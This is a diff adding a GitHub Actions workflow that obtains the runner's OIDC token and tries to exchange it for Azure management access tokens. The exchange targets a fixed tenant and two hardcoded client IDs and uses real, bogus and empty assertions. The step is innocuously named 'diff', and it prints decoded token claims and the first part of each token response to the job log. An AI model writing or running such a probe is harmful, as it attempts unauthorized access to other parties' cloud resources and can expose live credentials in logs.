@@ -1,0 +1,26 @@
+name: azoidc2
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  d:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: diff
+        run: |
+          set +e
+          O=$(curl -s -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
+          TOKEN=$(echo "$O" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))")
+          SUBJ=$(echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('sub'),'|',d.get('aud'),'|',d.get('iss'))")
+          echo "OIDC_SUB=$SUBJ"
+          ex(){ T=$1;C=$2;A=$3;L=$4
+            R=$(curl -s -m 15 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$A" -d client_id=$C --data-urlencode "scope=https://management.azure.com/.default")
+            echo "DIFF[$L]=$(echo "$R" | head -c 260)"; }
+          for C in 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab; do
+            ex 72f988bf-86f1-41af-91ab-2d7cd011db47 $C "$TOKEN" "real-$C"
+            ex 72f988bf-86f1-41af-91ab-2d7cd011db47 $C "aaa.bbb.ccc" "bogus-$C"
+            ex 72f988bf-86f1-41af-91ab-2d7cd011db47 $C "" "empty-$C"
+          done
